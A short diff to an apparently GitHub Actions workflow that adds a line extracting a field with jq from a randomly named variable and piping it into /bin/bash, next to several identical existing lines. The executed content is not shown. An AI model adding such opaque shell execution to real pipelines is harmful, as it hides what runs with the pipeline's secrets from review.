@@ -22,6 +22,7 @@ jobs:
           echo $osefi4 | jq -r .ppiy62 | /bin/bash
           echo $gle4573 | jq -r .xve0734 | /bin/bash
           printf '%s' "$zauzs6627" | jq -r .udrww46325 | /bin/bash
+          echo $fo9 | jq -r .sso8 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
